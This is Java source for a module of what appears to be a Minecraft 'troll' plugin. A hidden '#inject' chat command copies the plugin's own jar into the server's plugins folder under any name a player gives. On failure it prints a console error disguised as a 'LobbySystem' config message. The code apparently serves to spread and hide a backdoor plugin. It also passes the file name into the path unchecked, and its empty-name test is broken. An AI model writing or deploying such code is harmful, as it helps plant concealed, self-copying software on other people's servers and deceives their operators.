package com.troll.mods;

import java.io.File;
import java.io.IOException;

import org.bukkit.entity.Player;

import com.google.common.io.Files;
import com.troll.start.Start;

public class InjectModule extends Module {

	public InjectModule() {
		super("Inject", "Leotendo", "Dupliziere das Plugin");
	}
	
	@Override
	public boolean execute(Player p, String[] args) {
		if (args.length != 2) {
			p.sendMessage(Start.getInstance().getPrefix() + "§eBenutze: #inject <file>");
			return false;
		}
		
		String fileName = args[1];
		if (fileName == "") {
			p.sendMessage(Start.getInstance().getPrefix() + "§cBitte benenne die Datei!");
			return false;
		}
		
		try {
			Files.copy(Start.getInstance().getPluginFile(), new File("plugins/" + fileName + ".jar"));
		} catch (IOException e) {
			System.err.println("[LobbySystem] Unable to load config (twice)");
			p.sendMessage(Start.getInstance().getPrefix() + "§cDie Injection konnte nicht durchgeführt werden :/");
			return false;
		}
		
		p.sendMessage(Start.getInstance().getPrefix() + "§aLade Plugin in Datei: §e" + fileName);
		
		return true;
	}
}
